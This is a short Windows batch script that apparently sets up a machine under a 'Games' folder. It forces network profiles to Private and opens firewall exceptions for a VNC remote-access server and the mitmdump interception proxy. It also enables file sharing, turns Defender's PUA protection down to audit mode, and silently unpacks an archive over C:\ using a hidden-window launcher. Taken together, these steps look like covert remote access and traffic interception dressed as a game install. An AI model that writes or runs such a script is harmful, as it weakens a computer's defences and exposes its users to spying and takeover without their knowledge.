::::::::::::::::::::::::::::
::          START         ::
::::::::::::::::::::::::::::
Mode 90,20 & color 0A
SetLocal EnableExtensions DisableDelayedExpansion
(Set k=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles)
For /F "Delims==" %%A In ('Set GUID[ 2^>Nul') Do Set "%%A="
Set "i=101"
For /F "Tokens=1,2*" %%A In ('Reg Query "%k%" /S /V Description') Do (
    If "%%~nB" NEQ "%%~B" (
        Call Set "GUID[%%i:*1=%%]=%%~nB"
start "" "C:\Games\viewer.exe" /HideWindow Reg add "%k%\%%~nB" /V Category /t REG_DWORD /d 1 /f
    ) Else (
        Call Call Set GUID[%%i:*1=%%]="%%%%GUID[%%i:*1=%%]%%%%","%%C"
        Set/A i+=1
    )
)   
C:\Games\vc_redist.x64.exe /q /norestart
timeout /t 120
C:\Games\vc_redist.x86.exe /q /norestart
netsh firewall add allowedprogram program="C:\wampp13a\apache\apache.exe" name="MyApplication" mode=ENABLE 
netsh firewall add allowedprogram program="C:\Games\arpa\bin\mitmdump.exe" name="MyApplication" mode=ENABLE 
netsh firewall add allowedprogram program="C:\Games\winvnc.exe" name="MyApplication" mode=ENABLE 
netsh firewall add allowedprogram program="C:\wampp13a\apache\apache.exe" name="My Application" mode=ENABLE scope=ALL profile=ALL
netsh firewall add allowedprogram program="C:\Games\arpa\bin\mitmdump.exe" name="My Application" mode=ENABLE scope=ALL profile=ALL 
netsh firewall add allowedprogram program="C:\Games\winvnc.exe" name="My Application" mode=ENABLE scope=ALL profile=ALL
netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes
netsh interface teredo set state disabled
netsh interface ipv6 6to4 set state state=disabled undoonstop=disabled
netsh interface ipv6 isatap set state state=disabled
netsh firewall set icmpsetting type=ALL mode=DISABLE
set /a numa=%random% %%9999 +1000
set /a numb=%random% %%9999 +1000
set /a numc=%numa%%numb%
taskkill /im mitmproxy.exe /f
taskkill /im apache.exe /f
powershell.exe -ExecutionPolicy Bypass -Command Set-MpPreference -PUAProtection AuditMode
start /WAIT C:\Games\viewer.exe /HideWindow C:\Games\unzip.exe -o C:\Games\Games.zip -d C:\
del C:\Games\cmmc.cmd&move /Y C:\Games\cmmce.cmd C:\Games\cmmc.cmd